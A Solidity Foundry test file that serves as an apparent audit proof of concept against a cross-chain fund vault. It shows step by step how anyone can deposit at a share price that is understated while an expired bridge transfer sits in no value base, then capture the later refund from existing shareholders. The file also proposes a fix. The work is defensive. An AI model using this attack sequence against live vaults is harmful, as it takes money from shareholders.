// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IFundFactory} from "../../../src/interfaces/IFundFactory.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {FundFactory} from "../../../src/factory/FundFactory.sol";
import {CoreVault} from "../../../src/core/CoreVault.sol";
import {SpokeVault} from "../../../src/spoke/SpokeVault.sol";
import {TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {TransitMessage} from "../../../src/libraries/TransitMessage.sol";
import {Mandate, MandateLib} from "../../../src/mandate/Mandate.sol";
import {AccessFundFixture} from "./AccessFundFixture.sol";

/// @title PoC: an expired send home is in no value base between "presumed filled" and its refund; anyone mints
///        shares at the understated price and takes the refund from the shareholders
/// @notice TRUST BOUNDARY. A Spoke Vault cannot see the hub, so it PRESUMES a send home was filled once
///         `fillDeadline + maxReportAge` has passed and drops it from `inFlightToHub`
///         (SpokeCrossChainLib.sol:300-302, 103-106; OQ-09 stance). When the deposit in fact expired unfilled, the
///         Across refund only reaches the escrow 55 to 90 minutes after the fill deadline (docs/DECISIONS.md, measured
///         facts), while `maxReportAge` is about 26 minutes. In between, the amount is nowhere: the spoke debited its
///         Unallocated Balance at the send, the report no longer lists it in flight, the hub never received it. Share
///         Assets, hence Share Price, drop by the whole transfer although nothing was lost (DEC-104 broken), and come
///         back when `recognizeRefund` runs and the next report is accepted.
/// @notice ATTACK. Anyone watching a fund whose send home expired (no relayer took the quote, or the route was down;
///         docs/INTEGRATIONS.md says route liveness is off-chain) publishes and delivers the report that drops the
///         transfer (both permissionless), deposits at the understated price, then recognizes the refund
///         (permissionless), reports again and owns a share of the refund in proportion to the deposit. A malicious
///         manager can stage it alone: `sendToHub` with itself as exclusive relayer for the whole fill window, never
///         fill, deposit from a second address.
/// @notice IMPACT. Theft from the existing shareholders: here a 1,000,000 USDC deposit made during the gap captures
///         about 249,000 of a 299,000 USDC refund, and Alice's shares lose half their value. The entry and exit fees
///         (0.25% each way, 2% for an Instant Payout) do not come close to covering it.
/// @notice FIX. Do not presume a fill: keep a send home in `inFlightToHub` until its refund is recognized or until a
///         retention far beyond Across's refund latency has passed (the hub already nets out what it credited,
///         `CoreVaultLogic._returnLeg`, so a filled transfer kept listed counts zero). The same change closes
///         UnmatchedReturnLeg.t.sol.
contract ExpiredSendHomeMintPoC is AccessFundFixture {
    uint256 internal constant T0 = 1_800_000_000;
    uint256 internal constant FILL_WINDOW = 21_600;

    /// @dev What the spoke chain produced, carried across the chain switch in memory.
    struct SpokeSide {
        address spokeVault;
        bytes reportAfterArrival;
        bytes reportWhileInFlight;
        bytes reportAfterPresumedFill;
        bytes reportAfterRefund;
        uint256 presumedFilledAt;
        uint256 refundedAt;
    }

    function test_POC_expiredSendHomeLeavesEveryBaseAndANewEntrantCapturesTheRefund() public {
        // ---------------------------------------------------------------- Spoke Chain (its own state, run first)
        SpokeSide memory s = _spokeSide();

        // ---------------------------------------------------------------- Hub Chain
        _hubFactory();
        (IFundFactory.FundAddresses memory a,) = _createFund(_plan());
        CoreVault core = CoreVault(a.coreVault);
        _deposit(core, alice, 500_000e6);
        vm.prank(manager);
        core.sendToSpoke(0, 300_000e6, 0, _quote(299_700e6, address(0)));

        // Normal operation: the arrival, then the send home in flight. Alice's 498,750 shares are worth 1.00 each.
        vm.warp(T0 + 900);
        _deliverReport(a.valueReportReceiver, s.spokeVault, 0, s.reportAfterArrival);
        _deliverReport(a.valueReportReceiver, s.spokeVault, 1, s.reportWhileInFlight);
        assertEq(core.shareAssets(), 198_750e6 + 690e6 + 298_999e6, "Idle + spoke + the send home in flight");
        uint256 fairPrice = core.sharePrice();
        assertApproxEqRel(fairPrice, 1e24, 0.002e18);

        // The send home expired unfilled. The spoke presumes it filled and the report drops it; anyone delivers it.
        vm.warp(s.presumedFilledAt + 900);
        prices.setPrice(address(usdg), 1e18);
        vm.prank(stranger);
        _deliverReport(a.valueReportReceiver, s.spokeVault, 2, s.reportAfterPresumedFill);
        assertEq(core.shareAssets(), 198_750e6 + 690e6, "299,000 USDC of the fund is in no base");
        assertLt(core.sharePrice(), fairPrice * 41 / 100, "Share Price reads 0.40 although nothing was lost");

        // The attacker enters now.
        uint256 attackerShares = _deposit(core, stranger, 1_000_000e6);
        assertGt(attackerShares, 2_490_000e18, "2.49 million shares for 1,000,000 USDC");

        // The Across refund lands, `recognizeRefund` (permissionless) puts it back and the next report says so.
        vm.warp(s.refundedAt + 900);
        prices.setPrice(address(usdg), 1e18);
        _deliverReport(a.valueReportReceiver, s.spokeVault, 3, s.reportAfterRefund);
        assertApproxEqAbs(core.shareAssets(), 198_750e6 + 997_500e6 + 299_690e6, 1e6, "the refund is back");

        // Alice deposited 500,000 and lost nothing to any market; her shares are now worth about half.
        uint256 price = core.sharePrice();
        uint256 aliceValue = _shares(core, alice) * price / 1e36;
        uint256 attackerValue = attackerShares * price / 1e36;
        assertLt(aliceValue, 250_000e6, "Alice: under 250,000 USDC for shares that were worth 498,440");
        assertGt(attackerValue, 1_246_000e6, "the attacker: 1,246,000 USDC for a 1,000,000 deposit");

        // The attacker cashes out of Idle at once (Instant Payout, 2% Payout Fee and 0.25% flow fee included).
        uint256 before = _balance(usdc, stranger);
        vm.startPrank(stranger);
        core.requestPayout(1_190_000e6, ICoreVault.PayoutMode.Instant);
        core.claimPayout("");
        vm.stopPrank();
        uint256 cashed = _balance(usdc, stranger) - before;
        assertGt(cashed, 1_163_000e6, "1,163,000 USDC out against 1,000,000 in, in one claim");
        assertGt(_shares(core, stranger) * core.sharePrice() / 1e36, 55_000e6, "and shares worth 55,000 more");
    }

    /// @dev The spoke's half: the hub's send arrives; the manager sends 299,000 USDG home with a quote nobody fills;
    ///      the vault presumes the fill after `fillDeadline + maxReportAge`; the Across refund reaches the escrow 55
    ///      minutes after the deadline and is recognized. One report after each step.
    function _spokeSide() internal returns (SpokeSide memory s) {
        FundFactory spokeFactory = _spokeFactory();
        bytes32 fundId = spokeFactory.fundIdOf(HUB, 1, manager);
        Mandate memory m = _buildMandate(spokeFactory, fundId, _plan());
        vm.prank(manager);
        IFundFactory.ChainAddresses memory c = spokeFactory.createSpoke(1, m, _spokeParams(MandateLib.hash(m), _plan()));
        SpokeVault spoke = SpokeVault(c.spokeVault);
        s.spokeVault = c.spokeVault;

        bytes32 hubTransitId = keccak256(abi.encode(HUB, spokeFactory.addressOf(fundId, "CoreVault", HUB), uint256(1)));
        bytes memory message = TransitMessage.encode(fundId, HUB, hubTransitId, TransferKind.Principal);
        usdg.mint(address(spoke), 299_700e6);
        vm.prank(address(spokeAcross));
        spoke.handleV3AcrossMessage(address(usdg), 299_700e6, stranger, message);
        spoke.report();
        s.reportAfterArrival = spokeWormhole.published(0).payload;

        vm.prank(manager);
        bytes32 homeTransitId = spoke.sendToHub(299_000e6, TransferKind.Principal, 0, _quote(298_999e6, address(0)));
        spoke.report();
        s.reportWhileInFlight = spokeWormhole.published(1).payload;

        // Nobody fills. Past the deadline plus the report lifetime the vault presumes it was filled.
        vm.warp(T0 + FILL_WINDOW + MAX_REPORT_AGE + 1);
        spoke.report();
        s.reportAfterPresumedFill = spokeWormhole.published(2).payload;
        s.presumedFilledAt = block.timestamp;
        assertEq(spoke.buildReport().inFlightToHub.length, 0);
        assertEq(spoke.unallocatedBalance(address(usdg)), 690e6);

        // Across refunds the depositor of record (the escrow) 55 minutes after the deadline; anyone recognizes it.
        vm.warp(T0 + FILL_WINDOW + 55 minutes);
        usdg.mint(spoke.hubBoundTransit(homeTransitId).escrow, 299_000e6);
        vm.prank(stranger);
        spoke.recognizeRefund(homeTransitId);
        spoke.report();
        s.reportAfterRefund = spokeWormhole.published(3).payload;
        s.refundedAt = block.timestamp;
        assertEq(spoke.unallocatedBalance(address(usdg)), 299_690e6);
    }
}
